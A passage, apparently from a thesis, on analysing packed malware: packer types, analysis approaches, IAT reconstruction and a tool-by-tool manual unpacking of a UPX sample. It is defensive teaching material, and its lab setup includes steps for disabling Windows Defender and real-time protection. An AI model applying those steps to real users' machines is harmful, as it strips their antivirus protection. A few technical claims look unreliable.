packer","title":"<h2> <span style=\\"color:#da1953\\">3 St</span>andard packer vs runtime packer </h2>","body":["<p>One of the main advantages of using a standard packer is that it can compress the executable file, reducing its size on disk. This can be beneficial for distributing files over networks or on portable storage devices. However, because the packed file needs to be unpacked before it can execute normally, it can also make analysis and debug more difficult.</p>","<p>A standard packer typically works by compressing or encrypting the original executable file and then appending a small piece of code to the file. This code is responsible for decompressing or decrypting the rest of the file and generating the packed PE to be executed.</p>","<p>In contrast, a runtime packer modifies the executable file in memory, rather than on disk. There is a runtime component that is responsible for extracting each time the portions of code that the program needs and possibly removing those that are not currently in use. This makes it more difficult to detect and analyze the packed code since the modifications are not visible on the disk. Because runtime packers modify the program\'s memory space, they can also be used to protect against memory-based attacks, such as buffer overflows. By randomizing the memory layout of the program, a runtime packer can make it more difficult for attackers to exploit vulnerabilities in the code.</p>","<p>Different malware can implement different strategies to obfuscate the unpacked part each time. The one shown below is a simplified behaviour as they vary from malware to malware. The following image shows a simplified series of steps performed by the runtime packer:</p>","<p><img src=\\"/cyber/thesis/3.png\\" alt=\\"\\"></p>","<p>However, there are also some drawbacks to using a runtime packer. One of the main disadvantages is that it can make debugging and analysis more difficult since the packed code is not visible on the disk. In addition, because the packer code is executed in memory, it can be more vulnerable to anti-tampering techniques, such as code obfuscation or anti-debugging measures.</p>","<p>Overall, both packers and runtime packers are used to make malware analysis more difficult. While standard packers compress or encrypt an executable file on a disk, runtime packers modify the executable in memory. The use of runtime packers is becoming more common among malware authors, as they can be more difficult to detect and analyze. However, in order to increase even more the complexity of the analysis different combinations of different techniques can be put in place, for example, the technique previously mentioned in combination with parallel unpacking using child processes or threads will add complexity during the analysis phase.</p>"]},{"id":"4 Different approaches to analyze packed malware","title":"<h2> <span style=\\"color:#da1953\\">4 Di</span>fferent approaches to analyze packed malware</h2>","body":[{"id":"4.1 Intodcution","title":"<h3>4.1 Introduction</h3>","body":["<p>Malware analysis is a critical aspect of the cybersecurity field as it helps to identify, understand, and mitigate malicious software. Malware can be designed to cause various types of harm, such as stealing sensitive data, damaging systems, or hijacking resources for nefarious purposes. To counter such threats, security professionals use different methods and tools to analyze malware and gain insights into its behavior.</p>","<p>There are three primary approaches to analyzing malware: static analysis, dynamic analysis, and hybrid analysis. Each technique has its own strengths and weaknesses, and security analysts choose the appropriate method based on their objectives and the type of malware they are dealing with.</p>","<p>Static analysis involves analyzing the malware\'s code without actually executing it. One of the main advantages of static analysis is that it is a non-intrusive method, which means that the malware is not actually run on the system, reducing the risk of contamination and being discovered by the malware writer that his malware is being analyzed. This also prevents future patches by the malware writer in order to make the malware harder to be detected.</p>","<p>Additionally, static analysis can be performed quickly, making it an effective method for identifying known malware. For such purposes, various tools and techniques can be used such as disassembling the executable code, examining metadata, analyzing strings, and checking the digital signature of the file.</p>","<p>Dynamic analysis involves running the malware in a controlled environment, such as a virtual machine or sandbox, to observe its behavior. This technique is useful for detecting malware that is designed to evade detection or that requires specific environmental conditions to activate. Dynamic analysis techniques include monitoring system calls, network traffic, and file system changes.</p>","<p>The dynamic analysis provides detailed insights into the behavior of the malware, allowing analysts to identify the type of malware, its purpose, and the systems it interacts with. However, dynamic analysis can be a time-consuming process, and there is a risk of contamination if the malware is not properly contained in the analysis environment.</p>","<p>During this step, it is important to take all the precautions to safeguard the malware. It is important to execute it with due diligence and make sure the testing environment is isolated. Also, it is important to take a safe copy of the malware or execute continuous snapshots of the testing environment in case the malware deletes itself, overwrites portions of code, or implements additional defence mechanism to void being analyzed.</p>","<p>The hybrid analysis, a combination both static and dynamic analysis techniques, provides a comprehensive understanding of the malware. This technique involves first performing a static analysis to identify the malware\'s characteristics, followed by a dynamic analysis to observe its behaviour. Hybrid analysis can be an effective method for detecting advanced malware that is designed to evade detection or that uses sophisticated techniques to obfuscate its code.</p>","<p>The initial static analysis and the discovery of information in this phase are really helpful during the dynamic analysis phase. The static analysis gives an overview and an idea of the malware and what to expect from it, static analysis can also reduce the time consumed by the dynamic analysis phase in case some key information are found.</p>"]},{"id":"4.2 Static Analysis","title":"<h3>4.2 Static Analysis</h3>","body":["<p>One effective method of analyzing malware is through static analysis, which involves examining the code and structure of a malware sample without executing it. One of the primary techniques used in static analysis is disassembly, also known as reverse engineering. Disassembly involves converting the binary code of a program into human-readable assembly code that can be analyzed and understood.</p>","<p>During static analysis, it is possible to extract a wide range of information about malware, including the strings contained in the malware, the system calls used, and the entropy if the malware was packed. This information can help analysts understand the intent of the malware, its capabilities, and potential weaknesses that can be exploited.</p>","<p><i>\u201cBasic static analysis consists of examining the executable file without viewing the actual instructions. Basic static analysis can confirm whether a file is malicious, provide information about its functionality, and sometimes provide information that will allow you to produce simple network signatures. Basic static analysis is straightforward and can be quick, but it\u2019s largely ineffective against sophisticated malware, and it can miss important behaviors <sup>[1]</sup>\u201d</i>.</p>","<p>In the event of packed malware, the aim at this stage is to get a general idea of what the malware might be, i.e., whether the malware is really packed, whether there are indicators to confirm this, and the type of packing it might implement.</p>","<p>The following packing indicator is taken from DetectItEasy (DIE). With DIE, it is possible to identify packers and retrieve useful information about the malware sample. For instance, when analyzing a malware sample, DIE can identify whether malware is packed or not. In addition, DIE can retrieve the version number of the packer, in this specific case as shown below is 3.93, which can be used to identify known vulnerabilities and weaknesses in the packer itself which is useful during the analysis phase.</p>","<p><img src=\\"/cyber/thesis/4.png\\" alt=\\"\\"></p>","<p>A useful feature of DIE is the capability to obtain the number of sections from the packed file. This can provide valuable information on the internal structure of the malware and help to confirm the presence of the packer. In fact, from the malware sample analyzed, DIE found three sections containing UPX in the name.</p>","<p><img src=\\"/cyber/thesis/5.png\\" alt=\\"\\"></p>","<p>To further confirm whether the malware is packed or not, it is possible to check the entropy of the file. Since packed files tend to have a high entropy due to the compression and encryption techniques used, checking the entropy can help to confirm the presence of the packer. As shown in the picture there is a spike in the entropy graph reaching the value of 7 which we can consider enough high to say that the malware is packed.</p>","<p><img src=\\"/cyber/thesis/6.png\\" alt=\\"\\"></p>","<p>Another advantage of static analysis is that it can be performed on multiple samples simultaneously, allowing for rapid identification of commonalities and patterns across different malware variants. This can help analysts identify and understand larger malware families and the techniques they use to evade detection. This can be performed from the command line for example with the command \\"strings\\" and grepping key strings such as \\"host\\", \\"IP\\" or \\"socket\\" in search of an external connection to the command and control or via Yara rules that can identify patterns and advanced metrics.</p>","<p><img src=\\"/cyber/thesis/7.png\\" alt=\\"\\"></p>","<p>The subset of findings presented in the image above reveals important information about the behaviour of the analysed malware. One of the notable indicators is the string \'Writing %s section to 0x%p\\\\r\\\\n\', which suggests that the unpacked code is written into memory due to the presence of packing. Additionally, the strings \'Getting thread context\' and \'Setting thread context\' imply that the malware employs threads to perform certain operations. The occurrence of the strings \'Creating process\' and \'GetCurrentProcesID\' is indicative of the creation of new processes by the malware.</p>","<p>Moreover, the string \'IsDebuggerPreset\' raises the possibility that the malware attempts to detect whether it is being analysed and may modify its behaviour accordingly. This underscores the importance of using anti-analysis techniques by malware authors to evade detection and analysis by security researchers. This gives an idea of what the malware might do and how it might behave. This is very useful if, after the first static analysis phase, we proceed to a dynamic analysis, so that we already know what to expect from the malware.</p>","<p>However, there are also limitations to static analysis. For instance, some malware variants use advanced obfuscation techniques to make their code difficult to analyse, such as using anti-disassembly techniques or encrypting critical sections of their code. Additionally, static analysis alone cannot provide a complete understanding of how the malware operates, as it cannot account for the behaviour of the malware in different environments or the impact of the malware on the system.</p>"]},{"id":"4.3 Dynamic Analysis","title":"<h3>4.3 Dynamic analysis</h3>","body":["<p>Malware has become a significant threat to computer systems and networks, and its proliferation is increasing day by day. To counter this, various techniques have been developed to analyze malware and to understand its behavior, the operations it performs, and its objectives. For such purposes, dynamic analysis is used. It is the process of observing the behavior of a piece of malicious software and understanding its purpose.</p>","<p>The primary goal of dynamic analysis is to understand the behavior of the malware when it is executed. Dynamic analysis can help in identifying the malware\'s objectives, capabilities, and methods of propagation. In the case of packed malware dynamic analysis can help to find the critical pieces of code such as the stub which is the code used to extract the packed section or the tail jump, a jump instruction pointing to the original malicious code.</p>","<p>Dynamic analysis can also help in identifying the presence of any anti-analysis or evasion techniques used by the malware, in the event of packed malware for example it can monitor the read-and-write system calls of unpacked code and identify changes in the memory sections. It can also determine the malware\'s impact on the system or network, such as changes in the registry or file system, network communication, and system resource utilization.</p>","<p>The following image is the representation of the memory segment before and after executing the packed malware and it clearly indicates the changes it does and the extraction in memory of the packed code.</p>","<p><img src=\\"/cyber/thesis/8.png\\" alt=\\"\\"></p>","<p>In particular with dynamic analysis, it is possible to monitor system calls, by monitoring them it is possible to have a brief understanding, in some cases detailed and precise, of what operations the malware is performing and what can be the purpose of such. For example, if we find the socket() system call, we can assume that the malware most likely communicates with a remote host that could be the command and control (C&C). The purpose of such communication could be to receive remote commands to perform operations, exfiltrate data and send it to the remote host, or even update the malware.</p>","<p>Another advantage of running malware is that one can see the changes it makes to the system. Malware can make different changes to the system such as changes to the file system, registry, and system resources. These changes can, for instance, be intended to persist in the event of a system restart, to hide from analysts or security software, or create DLL files.</p>","<p>With dynamic analysis, it is also possible to analyze multi-threaded or multi-process malware. The creation and execution of these threads or processes are not immediate via static analysis. In fact, it is easier to run the malware, and then dump the threads or the processes it created. Even if most of this information could be found by static analysis, it involves very long analysis times that can be reduced by dynamic analysis, especially in the case of packed malware where the original code is obfuscated.</p>","<p>Dynamic analysis has its limitations, mainly due to the complexity of modern malware. Malware authors implement a variety of techniques to evade detection, such as anti-debugging and anti-virtualization techniques. They also use advanced encryption and obfuscation methods to make the malware more difficult to analyze and they can also be designed to detect the presence of a sandbox or virtual environment. Malware often alters its behavior accordingly in presence of an analysis environment or debuggers leading the analyst in the wrong direction.</p>"]},{"id":"4.4 Hybrid (sandbox) analysis","title":"<h3>4.4 Hybrid (sandbox) analysis</h3>","body":["<p>With dynamic analysis, it is possible to analyze the behavior of malware in a controlled environment. The main goal of dynamic analysis is to observe the behavior of malware when executed which otherwise could not be understood. Dynamic analysis can help in identifying the malware\'s intent, capabilities, and methods of propagation. For example, it can also identify the malware\'s impact on the system or network, such as changes in the registry or file system, creation of files, creation of scheduled tasks in order to survive a reboot, network communication, and system resource utilization. Dynamic analysis can also help in identifying the presence of any anti-analysis or evasion techniques used by the malware. This is especially useful in presence of thoroughly packed malware or a new packing technique in which unpacking is time-consuming. In this way, it is possible to understand up to a certain degree the analyzed malware and implement a provisional countermeasure.</p>","<p>The hybrid analysis differs from dynamic analysis in its scope. It combines both static and dynamic analysis. Further, it includes an analysis of external elements in which the malware may operate such as the network. Hybrid analysis does not limit to executing the malware, but it also creates a virtualized environment, even with several machines in order to allow the malware to perform the operations it would typically execute in a real-world environment.</p>","<p>However, there are also some limitations to hybrid analysis. For example, some malware may be designed to detect the presence of a VM or sandbox by implementing checks on the number of cores, number of RAM, and other metrics to understand if it is running in a genuine or controlled environment and alter its behaviour accordingly.</p>"]}]},{"id":"5 Simple packing and unpacking techniques","title":"<h2> <span style=\\"color:#da1953\\">5 Si</span>mple packing and unpacking techniques</h2>","body":[{"id":"5.1 Premise","title":"<h3>5.1 Premise</h3>","body":["<p>This chapter will further introduce packers and give some in depth knowledge about internal structure of a Portable Executable (PE) file thave a good understanding of each unpacking steps performed later on. Additional it will present a detailed guide on how to carry out static andynamic analysis, highlighting their key differences as well as their pros and cons. The tools required for each step will be listed and explainein order to provide a comprehensive understanding. The environment setup will also be described so that it can be replicated and the reasoninbehind such a strategy can be understood. The main objective of this chapter is to demonstrate a possible method of unpacking UPX and MPRESpackers in detail and provide insights into the expected outcomes.</p>"]},{"id":"5.2 Popular packers","title":"<h3>5.2 Popular packers</h3>","body":["<p>UPX and MPRESS are two popular packing commonly used in malware packing. UPX is an open-source executable packer that can compress executables and DLLs without damaging or changing the original code and it is completely self-contained. It uses a combination of multiple compression algorithms, including LZMA, Huffman coding, and Run Length Encoding (RLE), to compress the code. UPX supports a wide range of executable formats, such as Windows PE and Linux ELF. UPX is widely used by malware authors as it is easy to use and can quickly compress executables.</p>","<p>UPX is a popular packer in the malware development community due to its effectiveness in reducing the size of the executable and the availability of both encryption and compression. However, it is also well-known among security researchers and antivirus vendors, and many have developed signatures and heuristics to detect and analyze UPX-packed executables. As a result, malware developers have increasingly turned to more sophisticated packing algorithms, such as MPRESS, to evade detection.</p>","<p>On the other hand, the MPRESS packing is well known for its ability to hardly compress malware to make it harder to be detected and significantly reduce its size. It achieves this by replacing large sections of the original code with compressed and encrypted versions. The algorithm then adds the stub to compress/decompress the original code at runtime, making it difficult for static analysis tools to detect the true purpose of the malware.</p>","<p>MPRESS uses a variety of advanced techniques to make it difficult for analysts to reverse engineer the packed code. It uses a custom stub to pack and unpack the code, which makes it difficult for anti-virus software to detect and unpack the malware. The algorithm also uses anti-debugging techniques to prevent analysts from debugging the packed code or altering its execution in any way.</p>","<p>One of the main advantages of MPRESS is its speed and efficiency it has. The packing process is relatively fast, and the resulting packed file is highly compressed, which reduces the overall size of the file. This makes it easier for malware authors to distribute the packed file by being stealthier.</p>","<p>It is common among malware writers to create their own custom versions of packers. UPX is an open-source tool, which means that the source code is accessible and can modify it as needed. However, creating a custom version of a packer is not a trivial task and requires a good understanding of assembly language, binary file formats, and compression algorithms. In the case of MPESS is even harder as it is a proprietary packer and creating a custom version requires to reverse engineer it. By doing so malware writers will go against its license agreement.</p>","<p>Although a custom packer may not be as effective as the original packer in terms of compression ratio and speed, the main goal of malware writers is to make the malware less detectable possible and harder to be analyzed. Malware writers often introduce additional peace of code in order to change the malware signature to evade security systems or to deviate from the analyst analysis by introducing anti-analysis techniques.</p>"]},{"id":"5.3 Import address table (IAT)","title":"<h3>5.3 Import address table (IAT)</h3>","body":["<p>It is very important to introduce the concept of Import Address Table (IAT) to understand all the steps of malware analysis later on. In particular to understand the process of extracting and creating the PE file containing the unpacked code from a packed file.</p>","<p>The Import Address Table (IAT) is a crucial component in PE (Portable Executable) files used on Windows-based systems. The IAT is responsible for storing pointers to functions that are imported from other DLLs (Dynamic-Link Libraries), which is an essential part of allowing a program to call functions that are not part of its own code. This is a fundamental aspect of modular and maintainable programming.</p>","<p>During the resolution stage of a typical Windows PE executable, the header of the executable contains essential metadata that informs the operating system about the symbols from external libraries that the executable relies upon. When the operating system\'s loader processes the executable, it loads the necessary libraries into memory if they are not already loaded. The loader then assigns the addresses of the imported symbols to specific memory locations as specified by the metadata within the executable.</p>","<p>To clarify the image below, the IMAGE_IMPORT_BY_NAME  is a structure within the Import Address Table (IAT). It is used to store the import information for a specific function, including the function name and its corresponding hint value . The IMAGE_IMPORT_BY_NAME structure is employed when the import is performed using the name of the function, rather than its ordinal value, which are the two methods to import functions.</p>","<p>The Import Name Table (INT) stores the names of the imported functions from external DLLs. The Import Address Table (IAT) is responsible for holding the addresses of the imported functions after they have been resolved by the loader. It is an array of function pointers located within the PE file\'s data section. The IAT is populated by the loader with the actual addresses of the imported functions.</p>","<p>The purpose of the IMAGE_IMPORT_BY_NAME structure is to provide the necessary information for importing a function by its name. It contains the name of the function and its corresponding hint value, which is an index into the export name table of the DLL. The IMAGE_IMPORT_BY_NAME structure is used when the loader needs to resolve an imported function by name rather than by ordinal .</p>","<p>In the context of the IMAGE_IMPORT_BY_NAME structure in the Portable Executable (PE) format, the Hint value is an optional field that provides an additional hint to help identify the imported function. The Hint value is typically an index or position of the function within the export table of the DLL from which it is being imported. It allows for faster and more efficient resolution of imported functions, especially when the import code knows the specific Hint value to look for.</p>","<p><img src=\\"/cyber/thesis/9.png\\" alt=\\"\\"></p>","<p>However, in the case of packed executables created by packers, this metadata is often modified. Packers take on the responsibility of performing the resolution stage themselves instead of relying on the operating system\'s loader.</p>","<p>Packers typically employ techniques to handle the resolution of symbols and imported libraries internally. They analyze the packed executable, identify the required symbols, and dynamically resolve their addresses within the packed code. This allows the packed executable to function without relying on the standard resolution mechanism provided by the operating system\'s loader. By bypassing the standard resolution stage, packers can modify the structure of the executable and hide important information about dependencies, making it more challenging for reverse engineers and analysis tools to understand the executable\'s inner workings.</p>","<p>It\'s worth noting that the resolution stage performed by packers may vary depending on the specific packing technique used and the goals of the packer. Some packers may prioritize minimizing the size of the executable and focus on simple resolution mechanisms, while others may employ more advanced techniques to evade detection and analysis.</p>","<p>The IAT reconstruction is a feature of tools like Scylla <sup>[6]</sup>, typically involves scanning the binary of a loaded module (a process\'s executable image in memory) and identifying patterns that match the standard structure of an IAT. In other words, it\'s looking for arrays of memory addresses that point to valid locations within loaded DLLs. This process is often needed when analyzing malware or reversing a packed executable, where the IAT may be altered.</p>","<p>Once potential IAT locations are identified, the tool can often rebuild a valid IAT, allowing the binary to be dumped from memory and run as a standalone executable. This can be incredibly useful in malware analysis and similar reverse engineering tasks.</p>"]},{"id":"5.4 Environment Setup","title":"<h3>5.4 Environment Setup</h3>","body":["<p>For this setup, I opted to use a virtualized environment, specifically VMware Workstation<sup>[2]</sup> with Windows 10 Operating System. I chose Windows as several malware samples are readily available, and it is the most widely used and targeted operating system. Additionally, some critical tools are only accessible on Windows. While compatibility layers can allow these tools to be used on other operating systems such as Linux, their proper execution cannot be guaranteed.</p>","<p>To ensure efficient performance, I configured the Operating System with the minimum requirements of 4GB of RAM, 60GB of storage, and 4 cores, as the tools utilized are lightweight and do not require significant computational power. I made certain modifications within the Operating System such as disabling the Windows 10 Virus and Threat Protection. This was necessary to prevent Windows 10 from detecting the malware samples as malicious files and automatically deleting them.</p>","<p>Some other steps can be performed according to the needs:</p>","<p>To Disable Windows Defender</br><ol><li>Open Windows Security (type Windows Security in the search box)</li><li>Virus & threat protection \u2192 Virus & threat protection settings \u2192 Manage settings.</li><li>Switch Tamper Protection to Off</li></ol></p>","<p>To permanently disable Real Time Protection</br><ol><li>Open Local Group Policy Editor (type gpedit in the search box)</li><li>Computer Configuration \u2192 Administrative Templates \u2192 Windows Components \u2192 Microsoft Defender Antivirus \u2192 Real-time Protection</li><li>Enable Turn off real-time protection.</li><li>Reboot</li></ol></p>","<p>To permanently disable Microsoft Defender:</br><ol><li>Open Local Group Policy Editor (type gpedit in the search box)</li><li>Computer Configuration \u2192 Administrative Templates \u2192 Windows Components \u2192 Microsoft Defender Antivirus</li><li>Enable Turn off Microsoft Defender Antivirus</li><li>Reboot</li></ol></p>","<p>Disabling or removing the virtual machine\'s network card is a crucial step to prevent malware from communicating externally and causing unintentional malicious traffic. It is also important to keep the virtualization software, in my case VMware, up to date with the latest version to avoid exploitation of known vulnerabilities that could potentially allow the malware to escape the virtual environment and infect the host machine.</p>"]},{"id":"5.5 UPX","title":"<h3>5.5 UPX</h3>","body":["<p>For this demonstration of unpacking malware packed with UPX, I will be using the following tools:</br><ul><li>PEStudio <sup>[3]</sup></li><li>Detect It Easy <sup>[4]</sup></li><li>IDA (Free) <sup>[5]</sup></li><li>Scylla <sup>[6]</sup></li></ul></p>","<p>Before diving into how and why these tools are used, let\'s first introduce them and their purpose. PEStudio <sup>[3]</sup> provides information about malware and potential behavior, allowing us to gain an idea of what it might be. The tool also indicates whether a file is malicious or not, drawing from different sources. For example, it may analyze strings within the file that indicate modifications to registry keys, libraries, or imports that usual software do not contain or often used by malware. However, this can also result in many false positives. Additionally, PEStudio <sup>[3]</sup> provides an important indication of the presence of packers through the entropy value, which gives an indication of the file\'s level of compression.</p>","<p>DetectItEasy is a software tool that provides a straightforward approach to detecting the presence of packers. Its capabilities are similar to those of PEStudio <sup>[3]</sup> in terms of packer detection and using multiple tools can be useful in confirming the presence of packing.</p>","<p>IDA (Free) <sup>[5]</sup>, a free version of IDA <sup>[5]</sup> with limited functionality is mainly used to analyze the code inside the malware and to evaluate the malware behavior. In this case, we will use IDA <sup>[5]</sup> to find the tail jump (as described in \u201cDynamic Analysis\u201d chapter) in the case of UPX and the Original Entry Point (OEP) in the case of MPRESS.</p>","<p>Finally, we can utilize Scylla <sup>[6]</sup> to reconstruct the Import Address Table (IAT) of the unpacked code, dump the unpacked code from memory onto the disk and create a new executable file that includes only the original code.</p>",{"id":"5.5.1 Packing Indicators","title":"<h4>5.1.1 Packing indicators</h4>","body":["<p>In this section, we will attempt to collect all the evidence and indications of packing. This is the initial step in confirming the presence of packers and, if possible, identifying the packer\'s name. To accomplish this, we will utilize both PEStudio <sup>[3]</sup> and Detect it Easy <sup>[4]</sup> (DIE) and compared their results to ensure their similarity. It\'s important to note that despite performing the same task of detecting packer presence, their outcomes may differ slightly, potentially resulting in minor discrepancies in the result.</p>","<p>The first step to perform is to load the binary with Detect It Easy <sup>[4]</sup> and analyze the information it provided. </p>","<p><img src=\\"/cyber/thesis/10.png\\" alt=\\"\\"></p>","<p>After loading the binary with Detect It Easy <sup>[4]</sup>, it reveals that it was indeed packed with UPX and even provided version number 3.93. This information is crucial for the subsequent unpacking process.</p>","<p>In addition to the packing information, Detect It Easy <sup>[4]</sup> also provide us with the number of sections present in the binary. This is important as it allow us to cross-check the section count with that reported by other tools. Discrepancies between section counts could indicate malicious activity such as section padding or code injection.</p>","<p>Another important piece of information that we obtained from Detect It Easy <sup>[4]</sup> was the entropy value of the binary. Entropy is a measure of the randomness of the data in the binary. In the context of malware analysis, it can help indicate the presence of obfuscation or encryption techniques used by the malware author to evade detection.</p>","<p><img src=\\"/cyber/thesis/11.png\\" alt=\\"\\"></p>","<p>After loading the binary into Detect It Easy <sup>[4]</sup>, we can further check if it was packed or not. High entropy in a binary is usually a good indication of packing, but sometimes it can show that the binary is not packed even though it has a high level of entropy. For this sample I have a value of 7.09, the value is very high, and it is a clear indication of packing.</p>","<p>We also need to check the type of binary, which we can do by checking the H-hexadecimal key in the main window of Detect It Easy <sup>[4]</sup>. Although we already know it was a PE (Portable Executable), we just want to be sure.</p>","<p>The binary had the character \\"MZ\\", as shown below, which indicates that it is a PE. However, it is possible for attackers to change these characters to disguise the true type of the binary. Therefore, we also check the number of next bytes to verify if it was really a PE or not.</p>","<p><img src=\\"/cyber/thesis/12.png\\" alt=\\"\\"></p>","<p>At this point, we can used PEStudio <sup>[3]</sup> to gather more information about the binary and to confirm whether it is packed or not and if the results from both tools are similar. The first thing we must check is the size of the binary to get an idea of what we are dealing with. It is unlikely to have few imports if the file is very large, while for a small file, it is plausible but not certain. Therefore, it is best not to trust. For this sample the size 9728 bytes is in the norm, and the number of imports (18 imports) are not adequate. In general, programs of small to medium complexity already include a large number of functions imported from external libraries, a number that easily can cross 50 imports.</p>","<p><img src=\\"/cyber/thesis/13.png\\" alt=\\"\\"></p>","<p>Here, in addition to the file size, we also see the entropy (7,114) which is very high, close to Detect It Easy\u2019s <sup>[4]</sup> value and therefore it seems that it is packed. The Signature is further confirming that it is packed with UPX.</p>","<p>The next indicator can be found in the sections, in particular \u201cVirtual-Size\u201d and \u201cRaw-Size\u201d of the sections. If at last in one of them, the difference is so high it\u2019s a good indicator of packing.</p>","<p>If at least one section has a very high entropy, then it is another good indicator of packing (MAX-Entropy: 8), also if at least one section has WX (Writable and Executable) permission is also an indicator of packing.</p>","<p>In the following image, it is evident that the UPX0 section exhibits significant differences in both virtual size and raw size. Furthermore, the UPX1 section displays a notably high entropy value of 7168. These observations provide further confirmation of the packer\'s presence within the malware.</p>","<p><img src=\\"/cyber/thesis/14.png\\" alt=\\"\\"></p>","<p>Now we can check the imports, if they are so few it\u2019s a good indicator of packing, if \u201cGetProcess\u201d and \u201cLoadLibraryA\u201d are the only imports shown in the PEStudio [3] then we can be sure that the binary is packed.</p>","<p><img src=\\"/cyber/thesis/15.png\\" alt=\\"\\"></p>","<p>In this particular case, we have very few imports but there may be cases where we have only the previously mentioned imports. Finally, in the list of strings, we search for the presence of the packer\'s name. And to make the search easy we can reorder the list in ascending order as the packer names are very short.</p>","<p><img src=\\"/cyber/thesis/16.png\\" alt=\\"\\"></p>","<p>It is important to note that while we have confirmed the presence of the UPX packer at the beginning, the subsequent checks were conducted for the sake of completeness. While identifying the packer and its name was straightforward for this sample, more sophisticated malware samples may present more significant challenges, requiring the identification of additional indicators. Malware authors often employ tactics such as altering section names and signatures to make detecting the packer more difficult. The steps outlined in this analysis apply to any malware; however, they may not always suffice, and in some cases, code analysis using IDA <sup>[5]</sup> may be necessary to determine the specific packer employed, particularly in the case of custom packers.</p>","<p>Now that we made sure that the binary was packed, we will outline the process of how to unpack it, and the two cases where it was packed with MPRESS and the case where it was packed with UPX.</p>","<p>For the first part, we used a packed binary with UPX, but the results of PEStudio <sup>[3]</sup> and Detect It Easy <sup>[4]</sup> would have been almost identical if the file had been packed with MPRESS.</p>"]},{"id":"5.1.2 Manual Unpacking of UPX","title":"<h4>Manual Unpacking of UPX</h4>","body":["<p>In this section, the code will be analyzed using IDA <sup>[5]</sup> to identify the packed code and extract it into a new Portable Executable (PE) file, aiming to recreate the original file. It\'s important to note that the resulting file is typically very similar but rarely identical to the original file, despite executing in the same manner. This process is essentially the reverse of what was described in the \\"How Packers Work\\" section.</p>","<p><img src=\\"/cyber/thesis/17.png\\" alt=\\"\\"></p>","<p>To perform the unpacking, we use IDA <sup>[5]</sup>. Any version is fine, but in our case, we ca use IDA Free <sup>[5]</sup> and loaded the binary as a PE file.</p>","<p><img src=\\"/cyber/thesis/18.png\\" alt=\\"\\"></p>","<p>After loading the binary in IDA <sup>[5]</sup>, it warns us that certain imports are not visible and that the IAT (Import Address Table) is located outside of the memory range. This was a clear indication that the binary was packed.</p>","<p><img src=\\"/cyber/thesis/19.png\\" alt=\\"\\"></p>","<p>In order to unpack UPX, we have to search for a specific type of jump called a \\"tail jump\\". This term refers to the jump\'s typical location at the end of the program, but this is not always the case. The \\"tail jump\\" had a particular characteristic in that it traversed from one program section to another, making it a long jump.</p>","<p><img src=\\"/cyber/thesis/20.png\\" alt=\\"\\"></p>","<p>Here we have a jump in the UPX1 section which went to another section and jumped to address 402284 which is UPX0.</p>","<p><img src=\\"/cyber/thesis/21.png\\" alt=\\"\\"></p>","<p>Upon examining the code, we can observe that the address 402284 belongs to the UPX0 section and there are no similar jumps elsewhere, indicating that we have successfully identified the tail jump.</p>","<p>Next, we set a breakpoint at address 402284 and execute the binary and the resulting message serves as further confirmation that the binary has been packed.</p>","<p><img src=\\"/cyber/thesis/22.png\\" alt=\\"\\"></p>","<p>After pressing \u201cYes\u201d and continuing the execution, the code has been changed, and I could see the hidden portion of the code previously packed.</p>","<p><img src=\\"/cyber/thesis/23.png\\" alt=\\"\\"></p>","<p>We were at a \\"call\\" statement, which was the correct position for me to be in. At that point, we can use either the address of the jump instruction (402284) or the address (402558) as the OEP (Original Entry Point), and both addresses would have worked well.</p>","<p>To unpack, we utilize Scylla <sup>[6]</sup> and use one of the two addresses as input in the OEP field. Throughout these processes, we must keep IDA <sup>[5]</sup> running in debug mode and avoided closing it.</p>","<p>The next steps to perform in Scylla [6] are the following:</br><ol><li>Select the process of IDA <sup>[5]</sup> running the sample.</li><li>Insert in the OEP field the address found on IDA <sup>[5]</sup>.</li><li>Click \u201cIAT Autosearch\u201d</li></ol></p>","<p>These steps ensures that Scylla <sup>[6]</sup> can read from the process memory the unpacked code and extract it to recreate the executable file. In particular Scylla <sup>[6]</sup> starts to read from the OEP address and search for patters that match potential IAT (Import Address Table) to reconstruct it and create a new PE file with correct header and the unpacked code.</p>","<p>As we correctly provided the address Scylla <sup>[6]</sup> easily found the IAT. It is a good practice to restart Scylla <sup>[6]</sup> every time to ensure that it successfully finds the start address and size. This is necessary because Scylla <sup>[6]</sup> can be buggy and may not always provide accurate results.</p>","<p><img src=\\"/cyber/thesis/24.png\\" alt=\\"\\"></p>","<p>At that point, we are able to obtain the imports by simply clicking on \\"Get Imports\\".</p>","<p><img src=\\"/cyber/thesis/25.png\\" alt=\\"\\"></p>","<p>84 imports are found, and since we own the unpacked binary, we can double-check if the number of found imports matches with what Scylla <sup>[6]</sup> found.</p>","<p>In fact, PEStudio <sup>[3]</sup> told us that the original unpacked binary had 84 imports (as shows below), so we can confirm that our process had been successful. To create the unpacked binary, we simply clicked on \\"Dump\\" and saved the file, and it will create a new executable.</p>","<p><img src=\\"/cyber/thesis/26.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/thesis/27.png\\" alt=\\"\\"></p>","<p>Then, click on \\"Fix Dump\\" and chose the dump that had been created previously to create the unpacked binary. It may not be identical to the original file, but it will be really close.</p>","<p><img src=\\"/cyber/thesis/28.png\\" alt=\\"\\"></p>","<p>To further check, we load the new binary with PEStudio <sup>[3]</sup> against the packed file too see how they differ from each other.</p>","<p><img src=\\"/cyber/thesis/29.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/thesis/30.png\\" alt=\\"\\"></p>","<p>In the preview\u2019s images, we are able to see the difference between the original packed binary and the unpacked binary that we have created. The first thing we notice is that the size of our file was much larger, which is expected. Another thing that we notice is that the import of the new unpacked binary is 0. This is actually a problem with Scylla <sup>[6]</sup>, as long as the import were showing in Scylla <sup>[6]</sup> there is no problem with the unpacked binary even if PEStudio <sup>[3]</sup> are not showing them. Lastly, we can see that there are a higher number of strings than before which is also an expected change in the binary.</p>","<p>And with that, concludes the manual unpacking of a packed binary with UPX.</p>"]}]},{"id":"5.6 Mpress","title":"<h3>5.6 MPRESS</h3>","body":["<p>Unpacking executable files that have been compressed and protected by the MPRESS packer involves a distinct process compared to the previously discussed UPX packer. While the initial steps to identify the presence of packing in a file remain the same, the subsequent unpacking process and analysis of the MPRESS-packed executables require a different approach.</p>","<p>Similar to the UPX packer, the first step involves conducting a preliminary analysis of the file using tools such as PEStudio <sup>[3]</sup> and DetectItEasy <sup>[4]</sup> to identify indicators of packing. These indicators include reduced numbers of imports, unusually small sections, significant differences between the virtual size and raw size of sections, and other relevant characteristics.</p>","<p>It is important to introduce concept of hardware breakpoint to understand the steps where it is involved and its difference from software breakpoint. A hardware breakpoint is a powerful debugging feature offered by modern processors and debuggers that allows software developers and analysts to pause 